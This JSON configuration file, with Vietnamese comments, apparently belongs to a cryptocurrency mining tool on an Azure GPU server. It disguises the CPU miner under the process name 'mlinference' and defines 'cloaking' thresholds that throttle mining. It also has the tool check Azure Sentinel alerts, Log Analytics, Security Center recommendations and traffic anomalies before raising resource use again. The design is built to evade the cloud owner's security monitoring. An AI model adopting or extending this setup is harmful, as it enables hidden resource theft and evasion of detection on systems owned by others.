{
    "_comment": "Cấu hình tài nguyên dành cho ResourceManager, đảm bảo tối ưu hóa cho CPU, RAM, GPU, I/O, và băng thông mạng trên cơ sở hạ tầng mô tả.",
    "processes": {
      "_comment": "Định nghĩa tên tiến trình khai thác CPU và GPU để ResourceManager nhận diện.",
      "CPU": "mlinference",
      "GPU": "gpuminer"
    },
    "process_priority_map": {
      "_comment": "Xác định mức ưu tiên cho tiến trình. Giá trị càng cao, ưu tiên càng lớn.",
      "cpuminer": 2,
      "gpuminer": 3
    },
    "network_interface": "eth0",
    "optimization_parameters": {
      "_comment": "Các thông số tinh chỉnh thuật toán tối ưu tài nguyên.",
      "gpu_power_adjustment_step": 10,
      "_comment_gpu_power": "Mỗi lần điều chỉnh GPU sẽ thay đổi 10% mức sử dụng GPU.",
      "disk_io_limit_step_mbps": 10,
      "_comment_disk_io_step": "Mỗi lần điều chỉnh Disk I/O sẽ thay đổi 10 MBps."
    },
    "resource_allocation": {
      "_comment": "Cấu hình phân bổ tài nguyên tối ưu cho sản xuất.",
      "cpu": {
        "_comment": "Cấu hình dành cho CPU Intel Xeon E5-2690 v4 (12 vCPUs, 2.6GHz).",
        "max_threads": 12,
        "_comment_max_threads": "Giới hạn tối đa số vCPU có thể phân bổ cho tiến trình.",
        "default_freq_mhz": 2600,
        "_comment_default_freq": "Tần số mặc định ở mức 2.6GHz.",
        "min_freq_mhz": 1800,
        "_comment_min_freq": "Tần số CPU tối thiểu để giảm tải nhiệt và công suất.",
        "max_freq_mhz": 2600,
        "_comment_max_freq": "Tần số CPU tối đa không vượt quá mặc định của CPU."
      },
      "ram": {
        "_comment": "Giới hạn RAM tối đa dành cho tiến trình khai thác. Với 224 GiB ~ 229376 MB, đặt giới hạn nhằm đảm bảo dư địa cho hệ thống.",
        "max_allocation_mb": 200000
      },
      "gpu": {
        "_comment": "Giới hạn mức sử dụng GPU. Chúng ta có 2 GPU Tesla V100, mỗi cái 32GB. Cho phép tối đa 90% sử dụng.",
        "max_usage_percent": [90, 90],
        "_comment_usage_range": "Thêm phạm vi tối ưu để `setup_env.py` kiểm tra.",
        "usage_percent_range": {
          "_comment": "Phạm vi sử dụng GPU cho kiểm tra tính hợp lệ.",
          "max": 90
        }
      },
      "disk_io": {
        "_comment": "Giới hạn I/O cho ổ đĩa. Ổ cục bộ đạt 736-2948 MiB/s, đặt max ~2500 MBps. Min là 50 MBps.",
        "min_limit_mbps": 50,
        "max_limit_mbps": 2500
      },
      "network": {
        "_comment": "Giới hạn băng thông mạng. Hỗ trợ tối đa ~1600 Mbps, đặt max 1000 Mbps để cân bằng.",
        "bandwidth_limit_mbps": 1000
      },
      "cache": {
        "_comment": "Giới hạn bộ nhớ đệm cache chiếm dụng bởi tiến trình, tính theo phần trăm.",
        "limit_percent": 50
      }
    },
    "monitoring_parameters": {
      "_comment": "Cấu hình tần suất giám sát nhiệt độ, công suất, và tương tác với Azure Monitor.",
      "temperature_monitoring_interval_seconds": 15,
      "_comment_temperature_interval": "Kiểm tra nhiệt độ CPU/GPU mỗi 15 giây.",
      "power_monitoring_interval_seconds": 15,
      "_comment_power_interval": "Kiểm tra công suất CPU/GPU mỗi 15 giây.",
      "azure_monitor_interval_seconds": 300,
      "_comment_azure_monitor_interval": "Thu thập dữ liệu từ Azure Monitor mỗi 300 giây (5 phút).",
      "optimization_interval_seconds": 30,
      "_comment_optimization_interval": "Chạy mô hình AI để tối ưu tài nguyên mỗi 30 giây."
    },
    "temperature_limits": {
      "_comment": "Đặt ngưỡng nhiệt độ để tiến hành cloaking (lẩn tránh) nhằm giảm tải.",
      "cpu_max_celsius": 75,
      "gpu_max_celsius": 85
    },
    "power_limits": {
      "_comment": "Giới hạn công suất cho CPU và GPU nhằm tránh tiêu thụ quá mức.",
      "per_device_power_watts": {
        "cpu": 150,
        "gpu": 300
      }
    },
    "baseline_thresholds": {
      "_comment": "Các ngưỡng baseline để phát hiện bất thường (sử dụng trong anomaly_detector).",
      "cpu_usage_percent": 80,
      "_comment_cpu_usage": "Ngưỡng sử dụng CPU tổng thể (%) trên đó coi là bất thường.",
      "gpu_usage_percent": 80,
      "_comment_gpu_usage": "Ngưỡng sử dụng GPU (%) trên đó coi là bất thường.",
      "ram_usage_percent": 80,
      "_comment_ram_usage": "Ngưỡng sử dụng RAM tổng thể (%) trên đó coi là bất thường.",
      "disk_io_usage_mbps": 80,
      "_comment_disk_io_usage": "Ngưỡng sử dụng Disk I/O (MBps) trên đó coi là bất thường.",
      "network_usage_mbps": 80,
      "_comment_network_usage": "Ngưỡng sử dụng băng thông mạng (MBps) trên đó coi là bất thường."
    },
    "safe_restore_parameters": {
      "_comment": "Cấu hình để hỗ trợ kiểm tra an toàn trước khi khôi phục tài nguyên.",
      "enable_safe_restore": true,
      "_comment_enable_safe_restore": "Bật/tắt kiểm tra an toàn trước khi khôi phục.",
      "max_retry_attempts": 3,
      "_comment_max_retry": "Số lần thử lại nếu điều kiện chưa an toàn để khôi phục.",
      "retry_interval_seconds": 30,
      "_comment_retry_interval": "Thời gian chờ (giây) giữa các lần thử khôi phục.",
      "additional_checks": {
        "_comment": "Định nghĩa các kiểm tra bổ sung tùy chọn trước khi khôi phục.",
        "check_sentinel_alerts": true,
        "check_log_analytics": true,
        "check_security_recommendations": true,
        "check_traffic_anomalies": true
      }
    },
    "azure_integration": {
      "_comment": "Cấu hình bổ sung cho tích hợp với Azure Sentinel, Log Analytics, Security Center, Traffic Analytics.",
      "sentinel": {
        "_comment": "Cấu hình tham khảo cho Azure Sentinel.",
        "alert_check_days": 1,
        "_comment_alert_check": "Số ngày gần nhất để kiểm tra cảnh báo từ Azure Sentinel."
      },
      "log_analytics": {
        "_comment": "Cấu hình tham khảo cho Azure Log Analytics.",
        "query_interval_minutes": 5,
        "_comment_query_interval": "Thời gian (phút) giữa các lần truy vấn Log Analytics."
      },
      "security_center": {
        "_comment": "Cấu hình tham khảo cho Azure Security Center.",
        "recommendation_check_interval_minutes": 10,
        "_comment_security_interval": "Thời gian (phút) giữa các lần kiểm tra khuyến nghị bảo mật."
      },
      "traffic_analytics": {
        "_comment": "Cấu hình tham khảo cho Azure Traffic Analytics.",
        "check_interval_minutes": 10,
        "_comment_traffic_interval": "Thời gian (phút) giữa các lần kiểm tra lưu lượng bất thường."
      }
    },
  
    "_comment_setup_env": "Dưới đây là các cấu hình bổ sung để hỗ trợ setup_env.py, không ảnh hưởng đến cấu hình hiện tại.",
    "system_params": {
      "_comment": "Cấu hình hệ thống: múi giờ và locale để setup_env.py thiết lập.",
      "timezone": "UTC",
      "locale": "en_US.UTF-8"
    },
    "environmental_limits": {
      "_comment": "Các giới hạn môi trường để setup_env.py kiểm tra và thiết lập.",
      "baseline_monitoring": {
        "_comment": "Ngưỡng baseline cho CPU, GPU, Cache, Network, Disk I/O, Power.",
        "cpu_percent_threshold": 90,
        "_comment_cpu_threshold": "Ngưỡng CPU % để xem xét là cao.",
        "gpu_percent_threshold": 90,
        "_comment_gpu_threshold": "Ngưỡng GPU % để xem xét là cao.",
        "cache_percent_threshold": 80,
        "_comment_cache_threshold": "Ngưỡng Cache % để xem xét là cao.",
        "network_bandwidth_threshold_mbps": 1000,
        "_comment_network_bw_threshold": "Ngưỡng băng thông mạng (Mbps).",
        "disk_io_threshold_mbps": 500,
        "_comment_disk_io_threshold": "Ngưỡng Disk I/O (Mbps).",
        "power_consumption_threshold_watts": 500,
        "_comment_power_consumption_threshold": "Ngưỡng tiêu thụ năng lượng (W)."
      },
      "temperature_limits": {
        "_comment": "Giới hạn nhiệt độ CPU/GPU.",
        "cpu": {
          "max_celsius": 85,
          "_comment_cpu_temp": "Ngưỡng nhiệt độ CPU tối đa."
        },
        "gpu": {
          "max_celsius": 85,
          "_comment_gpu_temp": "Ngưỡng nhiệt độ GPU tối đa."
        }
      },
      "power_limits": {
        "_comment": "Giới hạn công suất tổng và per-device.",
        "total_power_watts": {
          "max": 200,
          "_comment_total_power": "Ngưỡng công suất tổng tối đa (W)."
        },
        "per_device_power_watts": {
          "cpu": {
            "max": 150,
            "_comment_cpu_power": "Ngưỡng công suất CPU tối đa (W)."
          },
          "gpu": {
            "max": 150,
            "_comment_gpu_power": "Ngưỡng công suất GPU tối đa (W)."
          }
        }
      },
      "memory_limits": {
        "_comment": "Giới hạn liên quan đến RAM.",
        "ram_percent_threshold": 85,
        "_comment_ram_percent": "Ngưỡng sử dụng RAM tổng thể (%)."
      },
      "gpu_optimization": {
        "_comment": "Cấu hình tối ưu GPU.",
        "gpu_utilization_percent_optimal": {
          "_comment": "Ngưỡng tối ưu GPU: min < max và trong [0,100].",
          "min": 30,
          "max": 80
        }
      }
    },
  
    "_comment": "Các cấu hình bổ sung cho Azure Anomaly Detector và Azure OpenAI Client.",
    "azure_anomaly_detector": {
      "_comment": "Cấu hình cho Azure Anomaly Detector Client.",
      "api_base": "https://eastus.api.cognitive.microsoft.com/",
      "_comment_api_base": "Endpoint API của Azure Anomaly Detector.",
      "api_key": "${ANOMALY_DETECTOR_API_KEY}",
      "_comment_api_key": "API Key cho Azure Anomaly Detector. Thay thế bằng khóa thực tế."
    },
    "azure_openai": {
      "_comment": "Cấu hình cho Azure OpenAI Client.",
      "api_base": "https://anomalyd.openai.azure.com/",
      "_comment_api_base": "Endpoint API của Azure OpenAI Service.",
      "api_key": "${OPENAI_API_KEY}",
      "_comment_api_key": "API Key cho Azure OpenAI Service. Thay thế bằng khóa thực tế.",
      "deployment_name": "gpt4-deployment-name",
      "_comment_deployment_name": "Tên deployment của Azure OpenAI Service.",
      "api_version": "2023-03-15-preview",
      "_comment_api_version": "Phiên bản API của Azure OpenAI Service."
    }
  }
